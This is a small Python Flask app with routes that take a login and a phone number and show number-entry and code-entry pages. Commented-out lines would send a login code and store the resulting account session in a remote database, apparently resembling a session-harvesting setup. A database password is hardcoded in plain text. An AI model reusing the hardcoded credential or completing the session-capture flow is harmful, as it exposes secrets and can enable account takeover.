from flask import Flask, render_template, request
from session import Session
import asyncio
from DataBase import DataBaseJson

app = Flask(__name__)
db = DataBaseJson("unrealskill.ueuo.com", "unrealskill.ueuo.com", "shluxa_111!")


@app.route('/')
async def index():
    request_login = request.args.get('login')
    if request_login and request_login != '':
        return render_template("number/number.html", username=request_login)
    else:
        return render_template("bad_request.html")


@app.route('/code', methods=['POST', 'GET'])
async def code():
    request_login = request.args.get('login')
    request_phone = request.args.get('phone')
    if request_login and request_login != '' and request_phone and request_phone != '':
        # session = Session()
        # asyncio.run(session.send_code(request_phone))
        # db.set_session(int(request_login), session.import_to_dict())
        return render_template("code/code.html", phone="+" + request_phone)
    else:
        return render_template("bad_request.html")

if __name__ == "__main__":
    app.run()

